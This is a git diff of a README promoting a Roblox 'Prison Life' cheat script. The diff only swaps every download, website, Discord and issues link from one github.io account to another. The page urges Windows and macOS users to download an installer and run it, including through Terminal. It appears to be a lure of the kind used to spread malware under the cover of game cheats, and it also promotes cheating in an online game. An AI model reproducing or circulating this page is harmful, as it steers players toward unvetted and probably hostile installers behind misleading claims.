@@ -8,9 +8,9 @@
 
 If you've spent hours grinding in Prison Life only to fall behind, this **prison life script** was built for you. It automates the most tedious parts of the game while giving you powerful tools to progress faster and stay ahead of everyone else.
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 Whether you're a casual player looking to progress passively or a competitive grinder pushing for the top, this script delivers a complete toolkit in one clean GUI. The best **prison life script** should do everything without requiring you to juggle multiple Pastebin links or outdated modules.
 
@@ -19,7 +19,7 @@ Key highlights include:
 - 🔫 **Weapon Farm** — locates and equips the best available weapons from all spawn points
 - 🏆 **Criminal Rank Boost** — maximizes escape count per session for fastest rank progression
 
-### [⬇️ Download Prison Life Script](https://WatchMizukageSnap.github.io/getwindows/)
+### [⬇️ Download Prison Life Script](https://WaterCongressman.github.io/win-download/)
 
 ---
 
@@ -71,7 +71,7 @@ There are dozens of scattered Pastebin pastes claiming to be the best **prison l
 
 ### 🖥️ Windows (PC)
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
 You'll need a script executor (such as Solara or Calamari) before running any script.
 
@@ -85,7 +85,7 @@ You'll need a script executor (such as Solara or Calamari) before running any sc
 
 ### 🍏 macOS (Intel/Apple Silicon)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 1. Press `⌘ + Space`, type **Terminal**, hit Enter
 2. Download the installer using the button above
@@ -148,4 +148,4 @@ This project is released for educational and research purposes only. Use respons
 
 ---
 
-<p align="center">Made with 🔓 by the Prison Life Script Dev Team — <a href="https://WatchMizukageSnap.github.io/getwindows/">Website</a> · <a href="https://WatchMizukageSnap.github.io/getwindows/">Discord</a> · <a href="https://WatchMizukageSnap.github.io/getwindows/">Issues</a></p>
+<p align="center">Made with 🔓 by the Prison Life Script Dev Team — <a href="https://WaterCongressman.github.io/win-download/">Website</a> · <a href="https://WaterCongressman.github.io/win-download/">Discord</a> · <a href="https://WaterCongressman.github.io/win-download/">Issues</a></p>
